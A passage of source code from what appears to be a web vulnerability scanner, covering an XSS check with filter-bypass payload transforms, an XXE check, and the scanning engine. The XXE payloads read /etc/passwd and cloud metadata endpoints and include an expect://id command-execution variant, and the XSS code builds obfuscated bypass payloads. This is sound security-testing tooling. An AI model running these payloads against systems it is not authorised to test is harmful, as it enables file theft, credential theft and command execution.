# Fallback — mixed context / unknown
_PAYLOADS["none"] = (
    _PAYLOADS["html_body"]
    + _PAYLOADS["attr_double"]
    + _PAYLOADS["js_string_single"]
    + _PAYLOADS["js_string_single_entity"]
    + _PAYLOADS["attr_href"]
)


def _payloads_for_context(ctx: str, filters: dict[str, bool]) -> list[str]:
    # _entity suffix — take base context + entity-specific payloads
    base_ctx = ctx.replace("_entity", "")
    base = list(_PAYLOADS.get(ctx, _PAYLOADS.get(base_ctx, _PAYLOADS["none"])))

    # For entity contexts add entity variants on top of base
    if ctx.endswith("_entity"):
        entity_key = ctx  # already in _PAYLOADS if defined
        base += list(_PAYLOADS.get(entity_key, []))
        # Deduplicate preserving order
        seen: set[str] = set()
        deduped = []
        for p in base:
            if p not in seen:
                seen.add(p)
                deduped.append(p)
        base = deduped

    if base_ctx == "html_body":
        if filters.get("angle_brackets"):
            base = _PAYLOADS["html_body_no_angle"]
        elif filters.get("on_keyword"):
            base += _PAYLOADS["html_body_no_on"]
        elif filters.get("script_keyword"):
            base += _PAYLOADS["html_body_no_script"]

    return base


# ── Bypass transforms ──────────────────────────────────────────────────────────

def _apply_bypass_transforms(payload: str) -> list[str]:
    """Generate bypass variants of a payload."""
    variants = []

    def add(p: str) -> None:
        if p != payload and p not in variants:
            variants.append(p)

    # Case
    add(payload.upper())
    add(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
    # Space substitution
    add(payload.replace(" ", "/**/"))
    add(payload.replace(" ", "\t"))
    add(payload.replace(" ", "\n"))
    # Tag splitting
    for kw in ("script", "img", "svg", "iframe"):
        if kw in payload.lower():
            broken = re.sub(re.escape(kw), kw[:2] + "<!---->" + kw[2:], payload, flags=re.I)
            add(broken)
            break
    # Null byte in tag name
    add(re.sub(r'<(script|img|svg)', lambda m: '<' + m.group(1)[:2] + '\x00' + m.group(1)[2:], payload, flags=re.I))
    # alert alternatives
    for repl in ("prompt(1)", "confirm(1)", "eval(atob('YWxlcnQoMSk='))",
                 "Function('ale'+'rt(1)')()", "[].constructor.constructor('alert(1)')()"):
        add(payload.replace("alert(1)", repl))
    # HTML entity encode angle brackets
    add(payload.replace("<", "&#60;").replace(">", "&#62;"))
    add(payload.replace("<", "&#x3C;").replace(">", "&#x3E;"))
    # Double URL encode
    add(payload.replace("<", "%253C").replace(">", "%253E"))
    # javascript: bypass variants
    if "javascript:" in payload.lower():
        add(re.sub(r'javascript:', 'javascript\t:', payload, flags=re.I))
        add(re.sub(r'javascript:', 'javascript\n:', payload, flags=re.I))
        add(re.sub(r'javascript:', '&#106;avascript:', payload, flags=re.I))
        add(re.sub(r'javascript:', 'java&#x09;script:', payload, flags=re.I))

    return variants


# ── Payload list builder ───────────────────────────────────────────────────────

def _build_payload_list(ctx: str, filters: dict[str, bool]) -> list[str]:
    """Build final marked payload list: context-based + bypass variants."""
    base = _payloads_for_context(ctx, filters)
    all_payloads = list(base)
    for p in base:
        all_payloads.extend(_apply_bypass_transforms(p))

    result = []
    seen_markers: set[str] = set()
    for p in all_payloads:
        marker, marked = _make_marker(p)
        if marker not in seen_markers:
            seen_markers.add(marker)
            result.append(marked)

    return result


# ── C.2 CSP Analysis (passive helper) ─────────────────────────────────────────

_CSP_WEAK_PATTERNS = [
    (re.compile(r"'unsafe-inline'", re.I),      "unsafe-inline allows inline XSS"),
    (re.compile(r"'unsafe-eval'", re.I),         "unsafe-eval allows eval-based XSS"),
    (re.compile(r"cdnjs\.cloudflare\.com", re.I),"cdnjs in CSP allows JSONP bypass"),
    (re.compile(r"ajax\.googleapis\.com", re.I), "ajax.googleapis.com allows JSONP bypass"),
    (re.compile(r"data:", re.I),                 "data: URI in CSP allows XSS"),
    (re.compile(r"\*\.?[a-z0-9-]+\.[a-z]{2,}", re.I), "wildcard domain in CSP"),
]


def _analyze_csp(headers: dict) -> list[str]:
    """Return list of CSP weakness descriptions, empty if no CSP or no issues."""
    csp = ""
    for k, v in headers.items():
        if k.lower() == "content-security-policy":
            csp = v
            break
    if not csp:
        return []
    issues = []
    for pat, desc in _CSP_WEAK_PATTERNS:
        if pat.search(csp):
            issues.append(desc)
    return issues


# ── Check class ────────────────────────────────────────────────────────────────

class XSSCheck(BaseCheck):
    name = "xss"
    description = "Reflected XSS — context-aware, filter bypass, mXSS, CSP analysis"
    severity = "medium"
    passive = False
    cwe = "CWE-79"
    mitre_attack = "T1059.007"
    uses_scan_pipeline = True  # engine calls scan() -> probe -> analyze()

    def get_payloads(self) -> list[str]:
        # Fallback used only by old scan() path — engine uses analyze() now
        return _build_payload_list("none", {})

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        if not _marker_in_body(payload, body):
            return None

        marker = _extract_marker(payload)
        search_term = marker if marker else payload.split("<!--")[0].strip()
        evidence = f"[{point.kind}:{point.name}] {search_term!r} reflected"
        idx = body.find(search_term)
        if idx >= 0:
            ctx_start = max(0, idx - 30)
            ctx_end = min(len(body), idx + len(search_term) + 30)
            snippet = body[ctx_start:ctx_end].replace("\n", " ").replace("\r", "")
            evidence = f"[{point.kind}:{point.name}] found: ...{snippet}..."

        from pentool.utils.parser import build_http_request
        return Finding(
            type="xss",
            name=f"Reflected XSS ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload,
            evidence=evidence,
            cwe=self.cwe,
            description=(
                f"Reflected XSS in {point.kind} param '{point.name}'. "
                "Payload echoed without HTML encoding."
            ),
            remediation=(
                "Encode all user input before outputting to HTML. "
                "Use Content-Security-Policy headers."
            ),
            mitre_attack=self.mitre_attack,
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        """Context-aware active scan: probe -> fingerprint -> sweep -> stored read-back."""
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import RequestMutator
        from urllib.parse import urlparse, urlunparse
        mutator = RequestMutator()
        findings = []

        for point in mutator.extract_points(request):
            # ── Phase 1: neutral probe to detect context ──────────────────────
            probe_id = uuid.uuid4().hex[:10]
            probe_mutated = mutator.mutate(request, point, probe_id)
            try:
                probe_resp = await http_client.send(probe_mutated)
                probe_body = get_body(probe_resp)
                ctx = _detect_context(probe_id, probe_body)
            except Exception:
                probe_body = ""
                ctx = "none"

            # ── Phase 2: filter fingerprint ───────────────────────────────────
            filters: dict[str, bool] = {}
            if probe_id in probe_body or probe_id in _normalize_html_entities(probe_body):
                filter_mutated = mutator.mutate(request, point, _FILTER_PROBE)
                try:
                    filter_resp = await http_client.send(filter_mutated)
                    filter_body = get_body(filter_resp)
                    filters = _fingerprint_filters(_FILTER_PROBE, filter_body)
                except Exception:
                    pass

            # ── Phase 3: context-aware payload sweep ──────────────────────────
            payloads = _build_payload_list(ctx, filters)
            found_reflected = False
            for payload in payloads:
                mutated = mutator.mutate(request, point, payload)
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, point, payload, resp)
                    if f:
                        findings.append(f)
                        found_reflected = True
                        break
                except Exception:
                    pass

            # ── Phase 4: Stored XSS read-back (POST points only) ─────────────
            # If the payload wasn't found in the direct POST response -> look for it on GET pages.
            # Logic: submit payload -> GET original URL + parent-path -> search for marker.
            if (not found_reflected
                    and point.kind in ("post", "json", "multipart")
                    and payloads):
                marker_payload = payloads[0]  # first (most likely) payload
                marker = _extract_marker(marker_payload)
                if marker:
                    submit_mutated = mutator.mutate(request, point, marker_payload)
                    try:
                        await http_client.send(submit_mutated)
                    except Exception:
                        pass
                    # Read-back candidates: the URL itself (GET) and parent
                    parsed_url = urlparse(request.url)
                    path = parsed_url.path.rstrip("/") or "/"
                    parent_path = "/".join(path.split("/")[:-1]) or "/"
                    candidate_urls = [
                        urlunparse(parsed_url._replace(query="", fragment="")),
                    ]
                    if parent_path != path:
                        candidate_urls.append(
                            urlunparse(parsed_url._replace(path=parent_path,
                                                            query="", fragment=""))
                        )
                    from pentool.utils.parser import ParsedRequest as _PR, build_http_request
                    for candidate_url in candidate_urls[:3]:
                        try:
                            get_req = _PR(
                                method="GET",
                                url=candidate_url,
                                headers=dict(request.headers),
                                body="",
                            )
                            get_resp = await http_client.send(get_req)
                            get_body_text = get_body(get_resp)
                            if marker in get_body_text:
                                # Found — detect context and create finding
                                stored_ctx = _detect_context(marker, get_body_text)
                                findings.append(Finding(
                                    type="xss",
                                    name=f"Stored XSS ({point.kind.upper()})",
                                    url=candidate_url,
                                    severity="high",  # Stored is always higher than Reflected
                                    parameter=point.name,
                                    payload=marker_payload,
                                    evidence=(
                                        f"[{point.kind}:{point.name}] marker "
                                        f"{marker!r} found at {candidate_url} "
                                        f"after POST - context: {stored_ctx}"
                                    ),
                                    cwe=self.cwe,
                                    description=(
                                        f"Stored XSS via {point.kind} param '{point.name}'. "
                                        f"Payload persisted and rendered at {candidate_url}."
                                    ),
                                    remediation=(
                                        "Encode all user input on output. "
                                        "Apply strict Content-Security-Policy."
                                    ),
                                    mitre_attack=self.mitre_attack,
                                    request_raw=build_http_request(submit_mutated),
                                    response_raw=format_response_raw(get_resp),
                                ))
                                break
                        except Exception:
                            pass

        return findings

    async def _check_csp_passive(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
    ) -> list["Finding"]:
        """C.2 — passive CSP analysis: report weak directives."""
        if response is None:
            return []
        headers = dict(response.headers or {})
        issues = _analyze_csp(headers)
        if not issues:
            return []
        return [Finding(
            type="xss",
            name="Weak Content-Security-Policy",
            url=request.url,
            severity="low",
            parameter="Content-Security-Policy",
            payload="",
            evidence="; ".join(issues),
            cwe="CWE-693",
            description=(
                "Content-Security-Policy contains weak directives that "
                "may allow XSS exploitation even if the page is otherwise protected."
            ),
            remediation=(
                "Remove 'unsafe-inline' and 'unsafe-eval'. "
                "Avoid CDN domains with JSONP endpoints in script-src."
            ),
            mitre_attack=self.mitre_attack,
            request_raw="",
            response_raw="",
        )]

    async def passive_scan(
        self,
        request: "ParsedRequest",
        response: "ParsedResponse | None",
        http_client: "HTTPClient",
    ) -> list["Finding"]:
        """Passive: CSP header analysis only."""
        return await self._check_csp_passive(request, response)

================================================================================

FILE: modules/scanner/checks/xxe.py
--------------------------------------------------------------------------------
"""XXE — XML External Entity Injection (CWE-611).

Improvements:
- XInclude detection (no DOCTYPE needed)
- JSON→XML conversion attempt
- PHP wrapper payloads
- Strict regex signatures (no false positives on 'DOCTYPE' in normal HTML)
- SVG upload context payloads
"""
from __future__ import annotations

import re
from typing import TYPE_CHECKING

from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.payloads import load_payloads
from pentool.modules.scanner.checks.helpers import get_body, get_status, format_response_raw

if TYPE_CHECKING:
    from pentool.modules.scanner.mutator import InjectionPoint
    from pentool.utils.parser import ParsedRequest, ParsedResponse

# ── Payload groups ─────────────────────────────────────────────────────────────

_CLASSIC_PAYLOADS = [
    # Linux passwd
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    # Windows
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
    # hostname (short, unlikely to be filtered)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
    # hosts
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
    # SSRF via XXE
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
    # PHP wrapper
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    # expect:// (RCE if PHP expect enabled)
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
    # Parameter entity variant
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
]

# XInclude — works when DOCTYPE processing is disabled but XInclude is allowed
_XINCLUDE_PAYLOADS = [
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>',
]

# SVG-based (for file upload endpoints accepting SVG/XML)
_SVG_PAYLOADS = [
    '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    '<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
    '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
]

# ── Signatures ─────────────────────────────────────────────────────────────────

_XXE_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"root:[x*!]:\d+:\d+"),                           "Linux /etc/passwd root entry"),
    (re.compile(r"daemon:[x*!]:\d+:\d+"),                         "Linux /etc/passwd daemon entry"),
    (re.compile(r":\d+:/[a-z]+/(?:bash|sh|false|nologin)\b"),     "Linux /etc/passwd shell field"),
    (re.compile(r"127\.0\.0\.1\s+localhost"),                      "/etc/hosts"),
    (re.compile(r"\[fonts\]|\[extensions\]", re.I),               "Windows win.ini"),
    (re.compile(r"for 16-bit app support", re.I),                  "Windows win.ini"),
    (re.compile(r"\bami-id\b"),                                    "AWS EC2 metadata via SSRF-XXE"),
    (re.compile(r"\blocal-ipv4\b"),                                "AWS EC2 metadata via SSRF-XXE"),
    (re.compile(r"\bcomputeMetadata\b"),                           "GCP metadata via SSRF-XXE"),
    (re.compile(r"uid=\d+\([\w-]+\)\s+gid=\d+"),                  "expect://id command output"),
    # base64-encoded /etc/passwd (first line: cm9vd... = "root")
    (re.compile(r"cm9vd[A-Za-z0-9+/]{10,}"),                      "PHP wrapper base64 passwd"),
]


def _check_xxe_response(body: str) -> tuple[bool, str]:
    for pattern, desc in _XXE_SIGNATURES:
        if pattern.search(body):
            return True, desc
    return False, ""


# ── XML/PHP detection ──────────────────────────────────────────────────────────

def _is_xml_request(request) -> bool:
    ct = ""
    for k, v in (getattr(request, "headers", {}) or {}).items():
        if k.lower() == "content-type":
            ct = v.lower()
            break
    if "xml" in ct or "svg" in ct:
        return True
    body = getattr(request, "body", "") or ""
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    s = body.strip()
    return s.startswith("<?xml") or s.startswith("<!")  or s.startswith("<root") or s.startswith("<foo")


def _is_json_request(request) -> bool:
    for k, v in (getattr(request, "headers", {}) or {}).items():
        if k.lower() == "content-type" and "json" in v.lower():
            return True
    body = getattr(request, "body", "") or ""
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    return body.strip().startswith("{")


def _json_to_xml_simple(json_body: str) -> str:
    """Convert flat JSON to simple XML for XXE test."""
    import json
    try:
        obj = json.loads(json_body)
        if not isinstance(obj, dict):
            return ""
        fields = "".join(f"<{k}>{v}</{k}>" for k, v in list(obj.items())[:3])
        return f'<?xml version="1.0"?><root>{fields}</root>'
    except Exception:
        return ""


# ── Check class ────────────────────────────────────────────────────────────────

class XXECheck(BaseCheck):
    name = "xxe"
    description = "XXE — XML External Entity / XInclude / SSRF via XXE"
    severity = "high"
    passive = False
    cwe = "CWE-611"
    mitre_attack = "T1190"
    uses_scan_pipeline = True  # scan() handles JSON→XML, SVG, XInclude contexts

    def get_payloads(self) -> list[str]:
        return _CLASSIC_PAYLOADS + _XINCLUDE_PAYLOADS + load_payloads("xxe")

    async def analyze(
        self,
        original_req: "ParsedRequest",
        mutated_req: "ParsedRequest",
        point: "InjectionPoint",
        payload: str,
        response: "ParsedResponse",
    ) -> "Finding | None":
        body = get_body(response)
        found, desc = _check_xxe_response(body)
        if not found:
            return None
        from pentool.utils.parser import build_http_request
        return Finding(
            type="xxe",
            name=f"XXE — XML External Entity ({point.kind.upper()})",
            url=mutated_req.url,
            severity=self.severity,
            parameter=point.name,
            payload=payload[:120],
            evidence=f"[{point.kind}:{point.name}] XXE file read: {desc}",
            cwe=self.cwe,
            mitre_attack=self.mitre_attack,
            description=(
                f"XXE in {point.kind} '{point.name}'. External entity resolved: {desc}."
            ),
            remediation=(
                "Disable external entity processing in XML parser. "
                "Use a safe XML library with XXE disabled by default."
            ),
            request_raw=build_http_request(mutated_req),
            response_raw=format_response_raw(response),
        )

    async def scan(self, request, response, http_client, **kwargs):
        if http_client is None:
            return []
        from pentool.modules.scanner.mutator import InjectionPoint
        from pentool.utils.parser import ParsedRequest as PR
        findings = []
        method = (getattr(request, "method", "GET") or "GET").upper()

        # ── Case 1: Request body is already XML → inject payloads as body ──────
        if method in ("POST", "PUT", "PATCH") and _is_xml_request(request):
            all_payloads = _CLASSIC_PAYLOADS + _XINCLUDE_PAYLOADS + load_payloads("xxe")
            fake_point = InjectionPoint(kind="post", name="body", original_value="")
            for payload in all_payloads:
                mutated = PR(
                    method=request.method,
                    url=request.url,
                    headers={**dict(request.headers or {}), "Content-Type": "application/xml"},
                    body=payload,
                )
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, fake_point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass

        # ── Case 2: JSON body → try as XML (some APIs accept both) ────────────
        if method in ("POST", "PUT", "PATCH") and not findings and _is_json_request(request):
            fake_point = InjectionPoint(kind="post", name="body(xml)", original_value="")
            for payload in _CLASSIC_PAYLOADS[:4]:  # just the common ones
                mutated = PR(
                    method=request.method,
                    url=request.url,
                    headers={**dict(request.headers or {}), "Content-Type": "application/xml"},
                    body=payload,
                )
                try:
                    resp = await http_client.send(mutated)
                    status = get_status(resp)
                    if status < 500:  # Server accepted the XML body
                        f = await self.analyze(request, mutated, fake_point, payload, resp)
                        if f:
                            findings.append(f)
                            break
                except Exception:
                    pass

        # ── Case 3: SVG payloads (for upload endpoints) ───────────────────────
        if method in ("POST", "PUT", "PATCH") and not findings:
            fake_point = InjectionPoint(kind="post", name="body(svg)", original_value="")
            for payload in _SVG_PAYLOADS:
                mutated = PR(
                    method=request.method,
                    url=request.url,
                    headers={**dict(request.headers or {}), "Content-Type": "image/svg+xml"},
                    body=payload,
                )
                try:
                    resp = await http_client.send(mutated)
                    f = await self.analyze(request, mutated, fake_point, payload, resp)
                    if f:
                        findings.append(f)
                        break
                except Exception:
                    pass

        return findings

FILE: modules/scanner/engine.py

"""ScanEngine — scanning engine with concurrency and rate limiting."""

from __future__ import annotations

import asyncio
from typing import Callable

from pentool.core.database import get_db
from pentool.core.logging import get_logger
from pentool.modules.scanner.base import BaseCheck, Finding
from pentool.modules.scanner.fingerprint import TechFingerprinter, TechProfile
from pentool.utils.parser import ParsedRequest, ParsedResponse

logger = get_logger(__name__)


class ScanEngine:
    """Scanning engine: registers checks, runs passive and active scans."""

    def __init__(
        self,
        db_path: str,
        concurrency: int = 5,
        request_delay: float = 0.0,
        http_client=None,
    ) -> None:
        self._db_path = db_path
        self._concurrency = concurrency
        self._request_delay = request_delay
        self._http_client = http_client
        self._checks: list[BaseCheck] = []
        self._seen_findings: set[tuple] = set()
        self._stop_requested: bool = False

    def request_stop(self) -> None:
        self._stop_requested = True

    def register_check(self, check: BaseCheck) -> None:
        self._checks.append(check)

    def register_checks(self, checks: list[BaseCheck]) -> None:
        self._checks.extend(checks)

    def get_registered_checks(self) -> list[BaseCheck]:
        return list(self._checks)

    def reset_dedup(self) -> None:
        self._seen_findings.clear()
        self._stop_requested = False

    async def run_passive(
        self,
        request: ParsedRequest,
        response: ParsedResponse,
    ) -> list[Finding]:
        """Run all passive checks on a request/response pair."""
        findings: list[Finding] = []
        for check in self._checks:
            if not check.passive:
                continue
            try:
                results = await check.scan(request, response, self._http_client)
                findings.extend(results)
            except Exception as exc:
                logger.warning("Passive check %s error: %s", check.name, exc)
        return findings

    async def run_active_on_requests(
        self,
        seed_requests: list[ParsedRequest],
        check_names: list[str] | None = None,
        on_finding: Callable[[Finding], None] | None = None,
        on_progress: Callable[[int, int], None] | None = None,
        on_request: Callable[[str, str, str], None] | None = None,
        on_request_sent: Callable[[int, int, str, str, str], None] | None = None,
    ) -> list[Finding]:
        """on_request_sent(requests_sent, threads_active, check_name, param_name, url)"""
        """Active scan on real ParsedRequests via RequestMutator.

        For each seed_request -> all injection points -> all checks -> payloads.
        Original headers, Cookie, and body are preserved in the mutated request.
        """
        from pentool.modules.scanner.mutator import RequestMutator

        active_checks = [
            c for c in self._checks
            if not c.passive
            and (check_names is None or c.name in check_names)
            and c.is_available()
        ]
        if not active_checks or not seed_requests:
            return []

        self.reset_dedup()
        mutator = RequestMutator()
        from pentool.modules.scanner.baseline import BaselineCache
        baseline_cache = BaselineCache()

        # ── Fingerprint the first request ─────────────────────────────────────
        tech_profile: TechProfile | None = None
        if self._http_client and seed_requests:
            try:
                tech_profile = await TechFingerprinter().fingerprint(
                    seed_requests[0].url, self._http_client
                )
                if tech_profile.waf.detected:
                    logger.info("WAF detected: %s (confidence=%d%%)",
                                tech_profile.waf.name, tech_profile.waf.confidence)
            except Exception as exc:
                logger.debug("Fingerprinting failed: %s", exc)

        # Build a flat task list (seed_req, point|None, check)
        # For uses_analyze_api=True and uses_scan_pipeline=True — per-point tasks.
        # For others (no injection points or global scan) — (req, None, check).
        tasks_list: list[tuple] = []
        for req in seed_requests:
            points = mutator.extract_points(req)
            logger.debug(
                "run_active_on_requests: url=%s points=%d checks=%d",
                req.url, len(points), len(active_checks),
            )
            for check in active_checks:
                # Skip check if TechProfile says it is not relevant
                if tech_profile is not None and not tech_profile.allows_check(check.name):
                    logger.debug("Skipping check %s (not relevant for tech stack)", check.name)
                    continue
                uses_pipeline = getattr(check, "uses_scan_pipeline", False)
                if check.uses_analyze_api:
                    # New analyze() API: engine mutates the request and calls analyze()
                    if points:
                        for point in points:
                            tasks_list.append((req, point, check))
                    # no points — skip (nothing to mutate)
                elif uses_pipeline and points:
                    # scan_pipeline with points: engine creates per-point tasks,
                    # passes point to scan() via kwargs -> parallelism at point level
                    for point in points:
                        tasks_list.append((req, point, check))
                else:
                    # Global scan() without points (CORS, passive, GraphQL, etc.)
                    tasks_list.append((req, None, check))

        total = len(tasks_list)
        logger.info(
            "run_active_on_requests: %d reqs x %d checks = %d tasks",
            len(seed_requests), len(active_checks), total,
        )
        semaphore = asyncio.Semaphore(self._concurrency)
        all_findings: list[Finding] = []
        done = 0
        requests_sent = 0   # actual HTTP requests sent
        threads_active = 0  # how many semaphore slots are occupied right now
        # No lock: asyncio is cooperative multitasking, int increments are atomic
        # between yield-points. A lock here would only queue every request.
        seen = self._seen_findings  # local reference for speed

        async def _run_one(seed_req: ParsedRequest, point, check: BaseCheck) -> None:
            nonlocal done, requests_sent, threads_active
            if self._stop_requested:
                return
            async with semaphore:
                if self._stop_requested:
                    return
                threads_active += 1
                if self._request_delay > 0:
                    await asyncio.sleep(self._request_delay)
                try:
                    if point is not None:
                        # Baseline for diff-skip (not for time-based and always_analyze)
                        always = getattr(check, "always_analyze", False)
                        baseline = None
                        if not always and self._http_client:
                            baseline = await baseline_cache.get_or_fetch(
                                seed_req, self._http_client
                            )
                        payloads = check.get_payloads()
                        for payload in payloads:
                            if self._stop_requested:
                                break
                            mutated = mutator.mutate(seed_req, point, payload)
                            requests_sent += 1
                            if on_request:
                                on_request(mutated.url, check.name,
                                           f"{point.kind}:{point.name}")
                            if on_request_sent:
                                on_request_sent(requests_sent, threads_active,
                                                check.name,
                                                f"{point.kind}:{point.name}",
                                                mutated.url)
                            resp = await self._http_client.send(mutated)
                            # Diff-skip: skip analysis if response is identical to baseline
                            if baseline is not None and baseline_cache.is_identical(baseline, resp):
                                continue
                            finding = await check.analyze(
                                seed_req, mutated, point, payload, resp
                            )
                            if finding is not None:
                                key = self._dedup_key(finding)
                                if key not in seen:
                                    seen.add(key)
                                    all_findings.append(finding)
                                    if on_finding:
                                        on_finding(finding)
                                break  # found — move to next point
                    else:
                        # scan() API — either per-point (point passed in kwargs)
                        # or global (check iterates all points itself)
                        _point_label = (
                            f"{point.kind}:{point.name}" if point is not None else "-"
                        )
                        requests_sent += 1
                        if on_request:
                            on_request(seed_req.url, check.name, _point_label)
                        if on_request_sent:
                            on_request_sent(requests_sent, threads_active,
                                            check.name, _point_label, seed_req.url)
                        # Pass point in kwargs if present — check works with one point
                        scan_kwargs = {}
                        if point is not None:
                            scan_kwargs["point"] = point
                            scan_kwargs["mutator"] = mutator
                            scan_kwargs["http_client"] = self._http_client
                        results = await check.scan(
                            seed_req, None, self._http_client, **scan_kwargs
                        )
                        for f in results:
                            key = self._dedup_key(f)
                            if key not in seen:
                                seen.add(key)
                                all_findings.append(f)
                                if on_finding:
                                    on_finding(f)
                except Exception as exc:
                    logger.warning(
                        "check %s point=%s url=%s: %s",
                        check.name,
                        getattr(point, "name", "-"),
                        getattr(seed_req, "url", "?"),
                        exc,
                    )
                finally:
                    threads_active -= 1
                    done += 1
                    if on_progress:
                        on_progress(done, total)

        await asyncio.gather(*[_run_one(r, p, c) for r, p, c in tasks_list])

        # ── AI Analysis (D.2) — post-scan heuristic scoring ──────────────────
        if all_findings:
            try:
                from pentool.modules.scanner.ai_analyzer import get_ai_analyzer
                analyzer = get_ai_analyzer()
                for finding in all_findings:
                    result = analyzer.score(finding) if hasattr(analyzer, "score") else None
                    if result is not None:
                        finding.ai_confidence = result.confidence
                        finding.ai_false_positive = result.is_false_positive
                        finding.ai_narrative = result.attack_narrative
                        finding.ai_model = result.model_used
            except Exception as exc:
                logger.debug("AI analysis failed: %s", exc)

        return all_findings

    async def run_active(
        self,
        targets: list[str],
        check_names: list[str] | None = None,
        on_finding: Callable | None = None,
        on_progress: Callable | None = None,
        on_request: Callable | None = None,
    ) -> list[Finding]:
        """Backward-compatibility wrapper: list[str] -> run_active_on_requests."""
        reqs = [ParsedRequest(method="GET", url=url, headers={}, body="")
                for url in targets]
        return await self.run_active_on_requests(
            seed_requests=reqs,
            check_names=check_names,
            on_finding=on_finding,
            on_progress=on_progress,
            on_request=(
                (lambda url, chk, pt: on_request(url, chk)) if on_request else None
            ),
        )

    def _dedup_key(self, f: Finding) -> tuple:
        from urllib.parse import urlparse
        try:
            path = urlparse(f.url).path or "/"
        except Exception:
            path = f.url
        return (f.type, path, f.parameter or "")

    async def save_findings(self, findings: list[Finding]) -> None:
        if not findings:
            return
        try:
            from urllib.parse import urlparse
            rows = [
                (
                    f.type, f.name, f.severity,
                    urlparse(f.url).netloc or f.url,
                    f.url, f.parameter, f.payload, f.evidence,
                    f.description, f.cwe, f.remediation, f.mitre_attack,
                    f.request_raw, f.response_raw,
                    1 if f.false_positive else 0,
                    f.timestamp.isoformat(),
                )
                for f in findings
            ]
            async with get_db(self._db_path) as db:
                await db.executemany(
                    """
                    INSERT INTO vulnerabilities
                        (type, name, severity, host, url, parameter, payload,
                         evidence, description, cwe, remediation, mitre_attack,
                         request_raw, response_raw, false_positive, timestamp)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    rows,
                )
                await db.commit()
        except Exception as exc:
            logger.error("save_findings error: %s", exc)

    async def get_findings(self, limit: int = 200) -> list[Finding]:
        try:
            async with get_db(self._db_path) as db:
                async with db.execute(
                    "SELECT * FROM vulnerabilities ORDER BY timestamp DESC LIMIT ?",
                    (limit,),
                ) as cur:
                    rows = await cur.fetchall()
            result = []
            for row in rows:
                keys = row.keys()
                result.append(Finding(
                    id=str(row["id"]),
                    type=row["type"],
                    name=row["name"] if "name" in keys else row["type"],
                    url=row["url"],
                    severity=row["severity"],
                    parameter=row["parameter"] or "",
                    payload=row["payload"] if "payload" in keys else "",
                    evidence=row["evidence"] or "",
                    description=row["description"] if "description" in keys else "",
                    cwe=row["cwe"] if "cwe" in keys else "",
                    remediation=row["remediation"] if "remediation" in keys else "",
                    mitre_attack=row["mitre_attack"] if "mitre_attack" in keys else "",
                    request_raw=row["request_raw"] if "request_raw" in keys else "",
                    response_raw=row["response_raw"] if "response_raw" in keys else "",
                    false_positive=bool(row["false_positive"]),
                ))
            return result
        except Exception as exc:
            logger.error("get_findings error: %s", exc)
            return []

    async def mark_false_positive(self, finding_id: str) -> None:
        try:
            async with get_db(self._db_path) as db:
                await db.execute(
                    "UPDATE vulnerabilities SET false_positive = 1 WHERE id = ?",
                    (int(finding_id) if finding_id.isdigit() else finding_id,),
                )
                await db.commit()
        except Exception as exc:
            logger.error("mark_false_positive error: %s", exc)

    async def get_stats(self) -> dict:
        """Aggregated findings statistics by severity for the Dashboard.

        Returns:
            dict: {
                "findings": {"critical": N, "high": N, ...},
                "top_finding": str — type of the latest finding or "-"
            }
        """
        result = {
            "findings": {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "top_finding": "-",
        }
        try:
            async with get_db(self._db_path) as db:
                # Group by severity
                async with db.execute(
                    "SELECT severity, COUNT(*) FROM vulnerabilities "
                    "WHERE false_positive=0 GROUP BY severity"
                ) as cur:
                    rows = await cur.fetchall()
                    for row in rows:
                        sev, cnt = row[0], row[1]
                        if sev in result["findings"]:
                            result["findings"][sev] = cnt
                # Latest finding type
                async with db.execute(
                    "SELECT type FROM vulnerabilities "
